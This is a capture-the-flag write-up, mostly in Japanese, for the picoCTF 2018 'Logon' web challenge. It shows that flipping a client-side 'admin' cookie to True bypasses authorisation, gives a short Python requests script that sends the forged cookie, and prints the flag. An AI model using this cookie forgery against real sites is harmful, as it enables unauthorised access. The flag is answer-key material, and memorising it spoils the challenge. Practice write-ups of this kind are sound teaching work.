# Logon 

## Solve
```
I made a website so now you can log on to! 
I don't seem to have the admin password. 
See if you can't get to the flag. 
http://2018shell.picoctf.com:57252 (link)
```

## Hint
```
Hmm it doesn't seem to check anyone's password, except for admins?
How does check the admin's password?
```

<br>

## Solution

![1](https://user-images.githubusercontent.com/47602064/67435086-5febf480-f626-11e9-936a-f712695e9339.png)

問題のページに移動すろとloginページが表示されます。

試しに`name: admin`と`pass: admin`と入力してみます。

![2](https://user-images.githubusercontent.com/47602064/67435187-9295ed00-f626-11e9-8c0b-ab7e8abb8b33.png)

すると以上のようにログインは出来たようですが、flagは得られませんでした・

デバッグで見てみると`Cookie`で`admin`が`false`になっていることが以下でわかります。

![3](https://user-images.githubusercontent.com/47602064/67435243-ae00f800-f626-11e9-872e-fa67274d0fd0.png)

![4](https://user-images.githubusercontent.com/47602064/67435306-ca9d3000-f626-11e9-819d-bc40c6595cca.png)

なのでそこを`True`に変えてみて再読込をしてみます。

![5](https://user-images.githubusercontent.com/47602064/67435350-e3a5e100-f626-11e9-939c-97ffc8177212.png)

すると`admin`で`True`の結果になり、flagが得ることが出来ました。

<br>

Pythonで実行させる場合は以下のようなプログラムでflagを綺麗に得ることが出来ます。

```python
#!/usr/bin/python

import requests
import re

params = {'user': 'test', 'password': 'test', 'submit': 'Sign In'}
jar = {'admin': 'True'}

r = requests.get('http://2018shell1.picoctf.com:37861/flag', data=params, cookies=jar)
source = r.text
print re.findall(r'(picoCTF\{.+\})', source)[0]
```


<br><br>

## FLAG: picoCTF{l0g1ns_ar3nt_r34l_2a968c11}
